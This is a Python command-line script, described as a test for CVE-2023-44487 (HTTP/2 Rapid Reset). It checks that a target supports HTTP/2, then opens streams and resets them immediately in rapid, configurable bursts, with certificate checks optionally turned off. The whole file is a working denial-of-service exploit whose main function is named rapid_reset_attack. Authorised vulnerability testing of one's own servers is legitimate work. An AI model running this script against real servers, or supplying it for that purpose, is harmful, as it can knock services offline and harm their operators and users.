import asyncio
import ssl
import time
import argparse
import socket
from h2.connection import H2Connection

# --- Helper Functions ---
def create_ssl_context(ignore_cert):
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2', 'http/1.1'])
    if ignore_cert:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    return ctx

def check_http2_support(host, port, ignore_cert):
    ctx = create_ssl_context(ignore_cert)
    try:
        sock = socket.create_connection((host, port), timeout=5)
        ssock = ctx.wrap_socket(sock, server_hostname=host)
        negotiated = ssock.selected_alpn_protocol()
        ssock.close()
        if negotiated == 'h2':
            return True
        return False
    except Exception as e:
        print(f"  [!] Could not connect to {host}:{port} ({e})")
        return False

async def rapid_reset_attack(host, port, path, num_streams, resets_per_sec, duration, ignore_cert, verbose):
    print(f"  [*] Starting rapid reset attack on {host}:{port}")
    ssl_ctx = create_ssl_context(ignore_cert)
    try:
        sock = socket.create_connection((host, port))
        sock = ssl_ctx.wrap_socket(sock, server_hostname=host)
        conn = H2Connection()
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        start_time = time.time()
        resets_sent = 0
        streams_sent = 0
        last_status = time.time()

        while time.time() - start_time < duration:
            for _ in range(num_streams):
                stream_id = conn.get_next_available_stream_id()
                headers = [
                    (':method', 'GET'),
                    (':authority', host),
                    (':scheme', 'https'),
                    (':path', path),
                ]
                conn.send_headers(stream_id, headers, end_stream=True)
                sock.sendall(conn.data_to_send())
                conn.reset_stream(stream_id, error_code=0)
                sock.sendall(conn.data_to_send())
                resets_sent += 1
                streams_sent += 1
                if verbose:
                    print(f"    Sent RST_STREAM for stream {stream_id}")
                if resets_per_sec > 0:
                    await asyncio.sleep(1.0 / resets_per_sec)
            # Status update every second
            if time.time() - last_status > 1:
                print(f"    [Status] Streams sent: {streams_sent}, Resets sent: {resets_sent}")
                last_status = time.time()
        sock.close()
        print(f"  [*] Test complete on {host}:{port}. Total streams: {streams_sent}, resets: {resets_sent}")
    except Exception as e:
        print(f"  [!] Error during attack on {host}:{port}: {e}")

def parse_ports(port_str):
    ports = set()
    for part in port_str.split(","):
        try:
            ports.add(int(part.strip()))
        except ValueError:
            pass
    return sorted(ports)

def main():
    parser = argparse.ArgumentParser(description="Test CVE-2023-44487 HTTP/2 Rapid Reset with granular options.")
    parser.add_argument("host", help="Target host")
    parser.add_argument("--ports", default="443", help="Comma-separated list of ports (default: 443)")
    parser.add_argument("--path", default="/", help="Request path (default: /)")
    parser.add_argument("--streams", type=int, default=100, help="Streams per batch (default: 100)")
    parser.add_argument("--rate", type=int, default=100, help="RST_STREAMs per second (default: 100)")
    parser.add_argument("--duration", type=int, default=10, help="Duration in seconds (default: 10)")
    parser.add_argument("--ignore-cert", action="store_true", help="Ignore SSL certificate verification")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    ports = parse_ports(args.ports)
    print(f"[*] Target: {args.host}")
    print(f"[*] Ports: {ports}")
    print(f"[*] Path: {args.path}")
    print(f"[*] Streams per batch: {args.streams}")
    print(f"[*] RST_STREAMs per second: {args.rate}")
    print(f"[*] Duration: {args.duration}s")
    print(f"[*] Ignore SSL cert: {args.ignore_cert}")

    async def run_tests():
        for port in ports:
            print(f"\n[*] Testing port {port}...")
            if check_http2_support(args.host, port, args.ignore_cert):
                print(f"  [+] HTTP/2 supported on port {port}. Initiating test...")
                await rapid_reset_attack(
                    args.host, port, args.path, args.streams, args.rate, args.duration, args.ignore_cert, args.verbose
                )
            else:
                print(f"  [-] HTTP/2 NOT supported on port {port}. Skipping.")
    asyncio.run(run_tests())

if __name__ == "__main__":
    main()